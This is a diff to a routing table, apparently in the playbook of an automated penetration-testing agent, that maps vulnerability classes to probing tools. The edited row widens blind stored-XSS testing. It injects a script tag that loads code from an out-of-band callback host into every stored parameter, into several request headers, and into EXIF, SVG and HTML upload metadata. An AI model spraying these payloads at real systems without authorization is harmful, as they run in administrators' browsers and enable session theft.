@@ -22,7 +22,7 @@ Class-specific overrides (route directly, skip auto_probe step):
 
 | category | direct tool |
 |---|---|
-| `xss` (blind/stored) | inject a Collaborator-pool payload (`"><script src=//POOL></script>`) into every stored-content param AND header (`X-Forwarded-For`/`Referer`/`User-Agent`/`X-Forwarded-Host`) with a per-field marker; then poll `get_collaborator_interactions` LATER (stored XSS fires on admin view, not in one poll). Reflected → `run_dalfox` / `probe_xss_executed`. |
+| `xss` (blind/stored) | inject a Collaborator-pool payload (`"><script src=//POOL></script>`) into every stored-content param AND header (`X-Forwarded-For`/`Referer`/`User-Agent`/`X-Forwarded-Host`) with a per-field marker; AND into uploaded-file metadata — EXIF `Comment`/`Title` (`exiftool`), SVG `onload`, HTML upload (KB `file_upload:metadata_stored_xss`, fires when an admin views the file). Poll `get_collaborator_interactions` LATER (stored XSS fires on admin view, not in one poll). Reflected → `run_dalfox` / `probe_xss_executed`. |
 | `cve_<id>` | `probe_cve_with_variants(cve_id=...)` |
 | `grpc_*` | `probe_grpc_reflection` + `probe_grpc_idor` |
 | `saml` | `probe_saml_xsw` |
